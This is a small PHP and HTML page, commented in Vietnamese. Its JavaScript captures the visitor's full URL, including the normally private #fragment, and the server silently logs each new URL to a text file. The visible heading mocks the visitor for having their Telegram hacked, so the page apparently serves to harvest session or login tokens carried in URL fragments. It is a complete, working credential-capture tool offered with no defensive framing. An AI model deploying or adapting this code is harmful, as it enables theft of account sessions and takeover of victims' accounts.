<?php
// Nhận URL đầy đủ từ query ?full=
if (isset($_GET['full'])) {
    $url = $_GET['full'];

    $logFile = 'urls.txt';
    $lines = file_exists($logFile) ? file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];

    if (!in_array($url, $lines)) {
        file_put_contents($logFile, $url . PHP_EOL, FILE_APPEND | LOCK_EX);
    }

    exit; // Không cần hiển thị gì
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Lưu URL có cả #fragment</title>
</head>
<body>
       <h2>bro bị heck tele r ._. bugineverything..</h2>

    <script>
        const fullUrl = window.location.href;
        fetch('?full=' + encodeURIComponent(fullUrl));
        
    </script>
</body>
</html>
